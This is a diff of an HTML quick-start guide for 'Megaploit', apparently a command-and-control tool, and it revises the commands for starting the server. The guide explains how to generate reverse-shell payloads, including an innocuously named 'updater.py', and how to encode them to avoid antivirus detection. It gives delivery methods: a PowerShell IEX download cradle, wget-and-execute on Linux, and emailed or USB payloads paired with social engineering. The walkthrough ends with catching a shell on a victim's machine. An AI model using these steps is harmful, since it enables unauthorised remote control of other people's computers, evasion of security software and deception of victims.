@@ -893,41 +893,41 @@
 </span></code></pre></div>
 <hr />
 <h2 id="4-start-the-server">4. Start the Server<a class="headerlink" href="#4-start-the-server" title="Permanent link">&para;</a></h2>
-<h3 id="basic-start-defaults-host-0000-port-4444">Basic start (defaults: host <code>0.0.0.0</code>, port <code>4444</code>)<a class="headerlink" href="#basic-start-defaults-host-0000-port-4444" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit
+<h3 id="basic-start">Basic start<a class="headerlink" href="#basic-start" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>python<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span>&lt;your-ip&gt;<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
 </span></code></pre></div>
+<p>Replace <code>&lt;your-ip&gt;</code> with the IP address the agent will call back to (your machine's IP
+visible to the target — not <code>0.0.0.0</code>).</p>
 <p>You should see:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>  __  __                       _       _ _
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a> |  \/  | ___  __ _  __ _ _ __| | ___ (_) |_
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a> | |\/| |/ _ \/ _` |/ _` | &#39;__| |/ _ \| | __|
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a> | |  | |  __/ (_| | (_| | |  | | (_) | | |_
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a> |_|  |_|\___|\__, |\__,_|_|  |_|\___/|_|\__|
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>              |___/
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>                       v4.1.0
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>[*] Listener started on 0.0.0.0:4444
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>megaploit &gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>[+] TLS auto-cert (required for C agent)  →  loot/tls/megaploit.crt
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>[+] Listener ready on 0.0.0.0:4444
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>[*] Agents should call back to  192.168.1.10:4444
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>megaploit &gt;
 </span></code></pre></div>
-<h3 id="custom-host-and-port">Custom host and port<a class="headerlink" href="#custom-host-and-port" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Listen on port 8080</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">8080</span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c1"># Listen on a specific interface</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--host<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span>--port<span class="w"> </span><span class="m">9999</span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="c1"># Use HTTPS (encrypted) transport</span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span><span class="w"> </span>--ssl
+<p><strong>TLS is always on.</strong> The server auto-generates a self-signed certificate in
+<code>loot/tls/</code> on first run and reuses it on every subsequent start. You do not
+need a <code>--tls</code> flag or a pre-existing certificate.</p>
+<h3 id="custom-port">Custom port<a class="headerlink" href="#custom-port" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>python<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-p<span class="w"> </span><span class="m">8443</span>
 </span></code></pre></div>
+<h3 id="bring-your-own-certificate-optional">Bring your own certificate (optional)<a class="headerlink" href="#bring-your-own-certificate-optional" title="Permanent link">&para;</a></h3>
+<p>If you have a real certificate (e.g. from Let's Encrypt or a CA):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--cert<span class="w"> </span>server.crt<span class="w"> </span>--key<span class="w"> </span>server.key
+</span></code></pre></div>
+<h3 id="restrict-which-ips-may-connect-optional">Restrict which IPs may connect (optional)<a class="headerlink" href="#restrict-which-ips-may-connect-optional" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">192</span>.168.1.10<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--allow-ip<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>--allow-ip<span class="w"> </span><span class="m">10</span>.0.0.6
+</span></code></pre></div>
+<p>Any connection from an IP not on the list is dropped before any data is read.</p>
 <h3 id="tip-run-on-a-vps-or-cloud-server">Tip — run on a VPS or cloud server<a class="headerlink" href="#tip-run-on-a-vps-or-cloud-server" title="Permanent link">&para;</a></h3>
-<p>If your target is on the internet (not your local network), start Megaploit on a <strong>VPS with a public IP</strong>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># On your VPS (e.g., 203.0.113.10)</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>megaploit<span class="w"> </span>--host<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="w"> </span><span class="m">443</span><span class="w"> </span>--ssl
+<p>If your target is on the internet, start Megaploit on a <strong>VPS with a public IP</strong>:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># On your VPS (e.g., 203.0.113.10)</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>python<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">203</span>.0.113.10<span class="w"> </span>-p<span class="w"> </span><span class="m">443</span>
 </span></code></pre></div>
-<p>Make sure port <code>443</code> (or whatever port you choose) is open in your firewall / security group.</p>
+<p>Make sure the chosen port is open in your firewall / security group.</p>
 <hr />
 <h2 id="5-build-your-first-payload">5. Build Your First Payload<a class="headerlink" href="#5-build-your-first-payload" title="Permanent link">&para;</a></h2>
 <p>The <code>generate</code> command builds a payload. Here is the most common usage:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>megaploit &gt; generate
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>megaploit &gt; generate
 </span></code></pre></div>
 <p>You will be prompted for:</p>
 <table>
@@ -962,47 +962,47 @@
 </tbody>
 </table>
 <h3 id="example-windows-exe-payload-most-common">Example — Windows EXE payload (most common)<a class="headerlink" href="#example-windows-exe-payload-most-common" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>megaploit &gt; generate
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>[?] Payload format: exe
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>[?] LHOST: 192.168.1.50
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>[?] LPORT: 4444
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>[?] Output file: payload.exe
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>[*] Generating payload...
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>[+] Saved: payload.exe (72 KB)
-</span></code></pre></div>
-<h3 id="example-linux-elf-binary">Example — Linux ELF binary<a class="headerlink" href="#example-linux-elf-binary" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>megaploit &gt; generate
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>[?] Payload format: elf
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>[?] LHOST: 192.168.1.50
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>[?] LPORT: 4444
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>[?] Output file: agent
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>[*] Generating payload...
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>[+] Saved: agent (48 KB)
-</span></code></pre></div>
-<h3 id="example-python-script-works-anywhere-python-is-installed">Example — Python script (works anywhere Python is installed)<a class="headerlink" href="#example-python-script-works-anywhere-python-is-installed" title="Permanent link">&para;</a></h3>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>megaploit &gt; generate
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>[?] Payload format: py
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>[?] Payload format: exe
 </span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>[?] LHOST: 192.168.1.50
 </span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>[?] LPORT: 4444
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>[?] Output file: updater.py
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>[+] Saved: updater.py
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>[?] Output file: payload.exe
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>[*] Generating payload...
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>[+] Saved: payload.exe (72 KB)
 </span></code></pre></div>
-<h3 id="example-powershell-one-liner-great-for-quick-tests">Example — PowerShell one-liner (great for quick tests)<a class="headerlink" href="#example-powershell-one-liner-great-for-quick-tests" title="Permanent link">&para;</a></h3>
+<h3 id="example-linux-elf-binary">Example — Linux ELF binary<a class="headerlink" href="#example-linux-elf-binary" title="Permanent link">&para;</a></h3>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>megaploit &gt; generate
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>[?] Payload format: ps1
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>[?] Payload format: elf
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>[?] LHOST: 192.168.1.50
 </span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>[?] LPORT: 4444
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>[?] Output file: run.ps1
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>[+] Saved: run.ps1
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>[?] Output file: agent
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>[*] Generating payload...
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>[+] Saved: agent (48 KB)
 </span></code></pre></div>
-<h3 id="add-an-encoder-to-avoid-antivirus-detection">Add an encoder to avoid antivirus detection<a class="headerlink" href="#add-an-encoder-to-avoid-antivirus-detection" title="Permanent link">&para;</a></h3>
+<h3 id="example-python-script-works-anywhere-python-is-installed">Example — Python script (works anywhere Python is installed)<a class="headerlink" href="#example-python-script-works-anywhere-python-is-installed" title="Permanent link">&para;</a></h3>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>megaploit &gt; generate
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>[?] Payload format: exe
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>[?] Payload format: py
 </span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>[?] LHOST: 192.168.1.50
 </span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>[?] LPORT: 4444
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>[?] Encoder: xor_b64
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>[?] Output file: payload_encoded.exe
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>[+] Saved: payload_encoded.exe
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>[?] Output file: updater.py
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>[+] Saved: updater.py
+</span></code></pre></div>
+<h3 id="example-powershell-one-liner-great-for-quick-tests">Example — PowerShell one-liner (great for quick tests)<a class="headerlink" href="#example-powershell-one-liner-great-for-quick-tests" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>megaploit &gt; generate
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>[?] Payload format: ps1
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>[?] LHOST: 192.168.1.50
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>[?] LPORT: 4444
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>[?] Output file: run.ps1
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>[+] Saved: run.ps1
+</span></code></pre></div>
+<h3 id="add-an-encoder-to-avoid-antivirus-detection">Add an encoder to avoid antivirus detection<a class="headerlink" href="#add-an-encoder-to-avoid-antivirus-detection" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>megaploit &gt; generate
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>[?] Payload format: exe
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>[?] LHOST: 192.168.1.50
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>[?] LPORT: 4444
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>[?] Encoder: xor_b64
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>[?] Output file: payload_encoded.exe
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>[+] Saved: payload_encoded.exe
 </span></code></pre></div>
 <blockquote>
 <p>See <a href="../PAYLOAD_BUILDER/"><code>docs/PAYLOAD_BUILDER.md</code></a> for all 14 formats and 12 encoders.</p>
@@ -1011,28 +1011,28 @@
 <h2 id="6-deliver-the-payload">6. Deliver the Payload<a class="headerlink" href="#6-deliver-the-payload" title="Permanent link">&para;</a></h2>
 <p>The payload file sits on <strong>your</strong> machine. You need to get it onto the target and run it.</p>
 <h3 id="method-a-python-http-server-easiest-for-a-lab">Method A — Python HTTP server (easiest for a lab)<a class="headerlink" href="#method-a-python-http-server-easiest-for-a-lab" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># From the directory containing your payload, start a web server</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># Serving HTTP on 0.0.0.0 port 8000 ...</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># From the directory containing your payload, start a web server</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># Serving HTTP on 0.0.0.0 port 8000 ...</span>
 </span></code></pre></div>
 <p>On the <strong>target machine</strong>, open a browser and navigate to:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>http://192.168.1.50:8000/payload.exe
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>http://192.168.1.50:8000/payload.exe
 </span></code></pre></div>
 <p>Download and run the file.</p>
 <h3 id="method-b-powershell-download-cradle-windows-target-no-browser-needed">Method B — PowerShell download cradle (Windows target, no browser needed)<a class="headerlink" href="#method-b-powershell-download-cradle-windows-target-no-browser-needed" title="Permanent link">&para;</a></h3>
 <p>Run this on the <strong>target</strong> in PowerShell:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># Download and execute in one line</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.1.50:8000/run.ps1&#39;</span><span class="p">)</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c"># Download and execute in one line</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.1.50:8000/run.ps1&#39;</span><span class="p">)</span>
 </span></code></pre></div>
 <p>Or download to disk first:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">50</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">Start-Process</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">50</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nb">Start-Process</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">payload</span><span class="p">.</span><span class="n">exe</span>
 </span></code></pre></div>
 <h3 id="method-c-wget-curl-linux-target">Method C — Wget / curl (Linux target)<a class="headerlink" href="#method-c-wget-curl-linux-target" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># On the Linux target</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>wget<span class="w"> </span>http://192.168.1.50:8000/agent<span class="w"> </span>-O<span class="w"> </span>/tmp/agent
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/agent
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>/tmp/agent<span class="w"> </span><span class="p">&amp;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># On the Linux target</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>wget<span class="w"> </span>http://192.168.1.50:8000/agent<span class="w"> </span>-O<span class="w"> </span>/tmp/agent
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/agent
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>/tmp/agent<span class="w"> </span><span class="p">&amp;</span>
 </span></code></pre></div>
 <h3 id="method-d-email-usb-physical-access">Method D — Email / USB (physical access)<a class="headerlink" href="#method-d-email-usb-physical-access" title="Permanent link">&para;</a></h3>
 <p>Copy <code>payload.exe</code> to a USB drive or send it as an email attachment (use social engineering). When the target opens it, you get a shell.</p>
@@ -1042,132 +1042,132 @@
 <hr />
 <h2 id="7-catch-a-shell">7. Catch a Shell<a class="headerlink" href="#7-catch-a-shell" title="Permanent link">&para;</a></h2>
 <p>Back in Megaploit, as soon as the target runs the payload you'll see:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>[+] New session opened: session-1
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>    Host: 192.168.1.100
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    OS:   Windows 10 Pro (x64)
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>    User: DESKTOP-ABC\john
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>megaploit &gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>[+] New session opened: session-1
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>    Host: 192.168.1.100
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>    OS:   Windows 10 Pro (x64)
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    User: DESKTOP-ABC\john
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>megaploit &gt;
 </span></code></pre></div>
 <h3 id="list-all-open-sessions">List all open sessions<a class="headerlink" href="#list-all-open-sessions" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>megaploit &gt; sessions
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>ID          Host             OS            User
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>session-1   192.168.1.100    Windows 10    john
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>megaploit &gt; sessions
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>ID          Host             OS            User
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>session-1   192.168.1.100    Windows 10    john
 </span></code></pre></div>
 <h3 id="interact-with-open-a-session">Interact with (open) a session<a class="headerlink" href="#interact-with-open-a-session" title="Permanent link">&para;</a></h3>
